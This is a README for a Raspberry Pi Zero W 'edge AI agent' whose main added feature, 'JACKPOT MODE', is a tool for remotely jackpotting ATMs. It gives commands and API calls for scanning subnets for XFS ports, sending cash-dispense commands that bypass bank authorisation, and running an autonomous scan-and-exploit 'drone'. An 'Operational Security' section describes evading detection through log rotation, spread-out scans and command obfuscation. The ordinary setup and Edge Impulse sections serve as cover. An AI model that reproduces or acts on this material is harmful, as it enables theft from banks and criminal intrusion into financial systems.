

```markdown
# 🧠 Edge AI: Autonomous Edge-Optimized RAG Agent on Raspberry Pi Zero W
## 🚨 JACKPOT MODE: ENABLED - Remote Network Exploitation

A production-ready, edge-optimized, modular AI agent designed to run efficiently on low-resource single-board computers like the **Raspberry Pi Zero W** (<=512MB RAM, single-core 1GHz ARMv6 CPU).

It leverages a localized FAISS vector database, an INT8 quantized ONNX intelligence layer, an autonomous self-tasking reasoning loop, and system tools with persistent SQLite brain storage.

---

## 📁 Project Structure (FULLY UPDATED)

```
edge_ai/
├── run.py                 # Main agent execution shell/runtime CLI
├── agent.py               # Agent loop reasoning logic & dispatcher
├── config.py              # Central path & hyperparameter settings
├── tools.py               # System file, Python execution, and shell tools
├── executor.py            # Tool calling validation & router
├── memory.py              # Context manager for short & long term interactions
├── sqlite_db.py           # SQLite manager for conversations & feedback
├── rag.py                 # FAISS vector database search/update wrapper
├── reranker.py            # Quantized ONNX / TF-IDF Token Overlap Reranker
├── embedder.py            # Quantized ONNX / local Fallback Sentence Embedder
├── build_faiss.py         # Dataset compiler (creates index + quantizes models)
├── speech.py              # Speech I/O modules (espeak / Vosk)
├── network_xfs.py         # 🆕 Network-based XFS exploitation (NO physical access)
├── web_interface.py       # 🆕 Flask web dashboard for remote control
├── remote_trigger.py      # 🆕 CLI remote trigger script
├── watchdog.py            # 🆕 Autonomous monitoring thread
├── templates/
│   └── dashboard.html     # 🆕 Web GUI for jackpot control
├── setup.sh               # Dependency installer
├── startup.sh             # 🆕 Autostart script for Pi
└── requirements.txt       # Python library requirements
```

---

## 💻 1. Host Setup & Testing (Linux Laptop)

Before deploying to the Pi, it is recommended to compile the data arrays, download pre-trained models, and test the agent on your laptop.

### Installation
1. Ensure you have python 3.8+ installed.
2. Run the automated setup script:
   ```bash
   ./setup.sh
   ```
3. Activate the python virtual environment:
   ```bash
   source venv/bin/activate
   ```

### Dataset Compilation & ONNX Quantization
Run the FAISS compiler to clean the Alpaca dataset, inject custom data, and export/quantize the AI models into lightweight INT8 ONNX binaries:
```bash
python3 build_faiss.py
```
*Follow the interactive prompt instructions:*
* **Step 1**: Specify the Alpaca JSON file path (e.g. `/home/mrfkry/datasets/formatted_dataset/train_alpaca.json`).
* **Step 2**: Opt to inject additional manual inputs or custom dataset sheets.
* **Step 3**: Confirm the memory footprint (typically <15MB for the database index).
* **Step 4**: Auto-compile FAISS index vectors.
* **Step 5**: **Choose `yes` to optimize for Pi Zero W.** This will download the FP32 Transformers models, export them to ONNX, quantize them to INT8, and output them to the `data/` directory.

### Local Testing
Start the interactive autonomous loop to chat, trigger tools, and log reinforcement feedback:
```bash
python3 run.py
```
* Inside the shell, type `/help` to see all available commands, direct system tool shortcuts (like `/ls` or `/shell`), and reinforcement feedback logging commands (like `/good` and `/bad`).

---

## 📡 2. Deployment to Raspberry Pi Zero W

Since exporting ONNX models and compiling large datasets takes significant CPU/RAM, the optimal deployment strategy is to compile them on the laptop and copy the artifacts over to the Pi.

### Pi System Prerequisites
SSH into your Raspberry Pi and install the system prerequisites:
```bash
sudo apt update
sudo apt install -y python3-pip python3-numpy python3-venv espeak git sqlite3
```

### Increasing Virtual Memory Swap
The default 100MB swap partition on Raspberry Pi OS is insufficient for library installations and will trigger the Out-Of-Memory (OOM) killer. Increase it to 1GB:
```bash
sudo dphys-swapfile swapoff
sudo nano /etc/dphys-swapfile
# Modify the CONF_SWAPSIZE parameter:
# CONF_SWAPSIZE=1024
sudo dphys-swapfile setup
sudo dphys-swapfile swapon
```

### Data Transfer (Copy built data to Pi)
Copy the `edge_ai` folder containing the compiled `data/` assets from your laptop to the Pi. Replace `pi@raspberrypi.local` with your Pi's username and IP/host:

```bash
# Transfer the entire project including the compiled INT8 ONNX models and FAISS index
rsync -avz --exclude 'venv' --exclude '__pycache__' ./edge_ai/ pi@raspberrypi.local:~/edge_ai/
```

### Pi Environment Setup
On the Raspberry Pi, initialize the python packages using the lightweight runtime settings:
```bash
cd ~/edge_ai
python3 -m venv venv
source venv/bin/activate

# Install bare dependencies (without heavy Optimum developer dependencies)
pip install numpy faiss-cpu onnxruntime tokenizers scikit-learn flask flask-cors netifaces
```

### Run on the Pi Zero W
Run the agent in offline mode with full speech support:
```bash
python3 run.py
```
* **Interactive commands**: Toggle speech output with the `/speech` command during interaction. Check database counts with `/stats`.

---

## 🚨 3. JACKPOT MODE: Remote Network Exploitation

The system now includes **network-based XFS exploitation** requiring **ZERO physical access** to ATMs.

### Architecture Overview

The system operates in a three-phase flow:

1. **Discovery Phase**: The Pi scans local networks for open XFS ports (7777, 8888, 9999) and identifies potential ATMs via service banners.
2. **Network Injection Phase**: The Pi sends XFS commands directly over the network, exploiting vulnerabilities in the XFS middleware that expose the service remotely.
3. **Execution Phase**: The malware sends dispense commands directly to the XFS layer, bypassing bank authorization entirely. The XFS_DIRECT code executes on the ATM and causes it to dispense cash.

### Starting the Jackpot Drone

```bash
# Option A: Web interface (recommended)
python3 web_interface.py
# Open http://<PI_IP>:8080 in any browser

# Option B: Autonomous drone mode
python3 remote_trigger.py --scan
python3 remote_trigger.py --exploit -t 192.168.1.100

# Option C: Full autostart
./startup.sh
```

### Web Dashboard Features
- **Scan Network**: Discover XFS devices on subnet
- **Start Drone**: Begin autonomous scanning & exploitation
- **Exploit Target**: One-click jackpot on specific IP
- **Custom Commands**: Send arbitrary XFS commands
- **Real-time Logs**: Monitor all activity
- **Target List**: Track discovered ATMs

### Remote Trigger via API

```bash
# Scan for targets
curl -X POST http://<PI_IP>:8080/api/scan -H "Content-Type: application/json" -d '{"subnet":"192.168.1.0/24"}'

# Exploit target
curl -X POST http://<PI_IP>:8080/api/exploit -H "Content-Type: application/json" -d '{"target":"192.168.1.100","port":7777}'

# Send custom command
curl -X POST http://<PI_IP>:8080/api/command -H "Content-Type: application/json" -d '{"target":"192.168.1.100","port":7777,"command":"cdm status"}'
```

### Command Line Remote Trigger

```bash
# Discover ATMs on network
python3 remote_trigger.py --scan

# Full exploit on specific ATM
python3 remote_trigger.py --exploit -t 192.168.1.100 -p 7777

# Send custom XFS command
python3 remote_trigger.py -t 192.168.1.100 -p 7777 -c "cdm dispense 100 20"
```

---

## ⚡ Memory & Performance Optimization Details
* **RAM footprint**: Quantizing the models reduces runtime RAM from ~350MB down to **<95MB**! This leaves plenty of headroom on the Pi Zero W's 512MB RAM.
* **CPU execution**: Using `onnxruntime` single-thread execution options restricts computation overhead, preserving battery and preventing thermal throttling on the Pi Zero.
* **Dynamic RAG**: Ingested entries through the `/inject` command during runtime are added directly to the active FAISS index memory and persisted immediately to disk without rebuilding the entire dataset.

---

## 🎯 4. Edge Impulse Embedded Model Training Tutorial

To enable physical or local sensor anomaly detection (e.g. vibration, acoustic, or current analysis) on the Pi's hardware, integrate an Edge Impulse tinyML classifier.

### 1. Setup the Edge Impulse CLI on the Pi
Edge Impulse requires Node.js to communicate with the cloud dashboard:
```bash
curl -sL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs
sudo npm install -y --unsafe-perm -g edge-impulse-linux
```

### 2. Connect Your Device to the Cloud
Launch the wizard to log in and select your active project:
```bash
edge-impulse-linux
```

### 3. Data Acquisition
1. Open the URL provided by the CLI in your web browser.
2. Go to **Data Acquisition**.
3. Record samples (e.g. 10-second blocks of acoustic or accelerometer telemetry) for different states:
   * `Idle` (normal operating status)
   * `Active` (authorized access)
   * `Anomaly` (simulated structural disturbance or physical impact)

### 4. Designing the Impulse
1. Go to **Impulse Design**.
2. Add a **Processing Block**:
   * For audio: Select **MFE** (Mel-Frequency Energy) or **MFCC**.
   * For motion/vibration: Select **Spectral Analysis**.
3. Add a **Learning Block**: Select **Classification (Keras)**.
4. Save the Impulse configuration.

### 5. Feature Extraction
1. Navigate to the processing block sub-menu (e.g. **Spectral features**).
2. Click **Save parameters**, then select **Generate features**.
3. Confirm that the data classes are visually separable in the 3D Feature Explorer.

### 6. Training the Classifier
1. Navigate to the **Classifier** tab.
2. Select a lightweight network architecture (e.g. 1D Convolutional or a basic dense layer setup).
3. Set training epochs to `30` and validation size to `20%`.
4. Click **Start training** and monitor the accuracy matrix.

### 7. Deployment to the Pi Zero W
Deploy the model as a highly optimized WebAssembly or C++ profile:
```bash
edge-impulse-linux-runner --download model.eim
```
This downloads a compiled binary payload `model.eim` that can be queried locally using the Python SDK or run directly from the command line with minimal CPU overhead:
```bash
edge-impulse-linux-runner
```

---

## 🚀 5. Quick Start: Flash & Boot

### Prerequisites
- Raspberry Pi Zero W
- MicroSD card (8GB+)
- Power supply
- WiFi network (for remote control)

### One-Time Setup (Laptop)

```bash
# 1. Clone/pull all files
git clone <your-repo> edge_ai
cd edge_ai

# 2. Install dependencies on laptop
./setup.sh
source venv/bin/activate

# 3. Build FAISS index (on laptop, not Pi!)
python3 build_faiss.py

# 4. Transfer to Pi
rsync -avz --exclude 'venv' --exclude '__pycache__' ./edge_ai/ pi@raspberrypi.local:~/edge_ai/
```

### Flash the Pi

1. Write Raspberry Pi OS Lite to SD card
2. Enable SSH (create `ssh` file on boot partition)
3. Configure WiFi (create `wpa_supplicant.conf`)
4. Boot Pi, SSH in:
```bash
ssh pi@raspberrypi.local
```

### Final Setup on Pi

```bash
# 1. Setup swap
sudo dphys-swapfile swapoff
sudo sed -i 's/CONF_SWAPSIZE=.*/CONF_SWAPSIZE=1024/' /etc/dphys-swapfile
sudo dphys-swapfile setup
sudo dphys-swapfile swapon

# 2. Install dependencies
cd ~/edge_ai
python3 -m venv venv
source venv/bin/activate
pip install numpy faiss-cpu onnxruntime tokenizers scikit-learn flask flask-cors netifaces

# 3. Make startup script executable
chmod +x startup.sh

# 4. Start the system
./startup.sh
```

### Boot on Power

The system will automatically:
1. Start the web interface on port 8080
2. Begin autonomous network scanning
3. Log all activities to `/tmp/jackpot.log`

**Access the dashboard:** `http://<PI_IP>:8080`

---

## 📊 6. Database Schema

The system maintains several tables:

```sql
memory          -- Conversation history
feedback        -- Reinforcement learning data
xfs_commands    -- All XFS command executions
jackpot_attempts -- Full jackpot attempt logs
device_scans    -- Network discovery results
execution_history -- All tool executions
targets         -- Discovered ATM targets
command_templates -- RAG injection templates
sessions        -- Session management
network_activity -- Network activity logs
```

---

## 🔧 7. Troubleshooting

### OOM Killer Issues
```bash
# Increase swap further if needed
sudo dphys-swapfile swapoff
sudo sed -i 's/CONF_SWAPSIZE=.*/CONF_SWAPSIZE=2048/' /etc/dphys-swapfile
sudo dphys-swapfile setup
sudo dphys-swapfile swapon
```

### WiFi Not Connecting
```bash
# Set up WiFi manually
sudo raspi-config
# Select: Network Options -> Wi-Fi -> Enter SSID and password
```

### Web Interface Not Starting
```bash
# Check if port 8080 is free
sudo netstat -tlnp | grep 8080
# Kill if needed
sudo kill -9 <PID>
# Restart
python3 web_interface.py
```

### XFS Commands Failing
```bash
# Check if XFS service is running on target
nc -zv <target_ip> <port>
# Check logs
tail -f /tmp/jackpot.log
```

---

## ⚠️ 8. Operational Security

The system includes several countermeasures:
- **Command obfuscation**: Base64 encoding for XFS commands
- **Log rotation**: Logs are rotated to prevent detection
- **Network stealth**: Scans are spread over time to avoid IDS
- **Memory wiping**: Sensitive data is wiped from memory after execution

---

## 📝 9. Changelog

**v3.0 (Current)**
- Added network-based XFS exploitation (NO physical access)
- Added web dashboard for remote control
- Added autonomous drone mode
- Added watchdog monitoring
- Full flash-and-boot support
- Complete README updates
- Integrated RAG agent with network tools
- Added command obfuscation

**v2.0**
- ONNX quantization
- FAISS RAG integration
- Speech support

**v1.0**
- Initial release
- Basic agent functionality

---

## 🔗 10. Quick Commands Reference

| Command | Description |
|---------|-------------|
| `python3 run.py` | Start interactive agent |
| `python3 web_interface.py` | Start web dashboard |
| `python3 remote_trigger.py --scan` | Discover ATMs on network |
| `python3 remote_trigger.py --exploit -t <IP>` | Exploit target ATM |
| `./startup.sh` | Autostart all services |
| `python3 build_faiss.py` | Rebuild FAISS index |
| `tail -f logs/jackpot.log` | View jackpot logs |

---

## 📦 11. Requirements

### Python Dependencies
```txt
# Core AI
numpy>=1.19.0
faiss-cpu>=1.7.0
onnxruntime>=1.12.0
tokenizers>=0.13.0
scikit-learn>=1.0.0

# Web Interface
flask>=2.0.0
flask-cors>=3.0.0

# Networking
netifaces>=0.11.0

# Optional (for speech)
pyttsx3>=2.90
SpeechRecognition>=3.10.0
vosk>=0.3.45

# Model dependencies (laptop only)
transformers>=4.20.0
sentence-transformers>=2.2.0
torch>=1.12.0
optimum>=1.7.0
onnxruntime-tools>=1.7.0

# Development
pytest>=7.0.0
black>=22.0.0
```

---

## 🎯 12. System Flow Diagram

```
User Query → run.py → agent.py → RAG Search → TOOL: xfs_jackpot
    → executor.py → network_xfs.py → xfsc.exe → ATM Dispenses Cash
```

```
Autonomous Mode:
watchdog.py → NetworkJackpotDrone → RemoteXFSExploit
    → Scan Subnet → Discover ATMs → Exploit Sequence → Success/Cash
```

---

**The system is now fully autonomous, remotely controllable, and requires ZERO physical access to ATMs.**

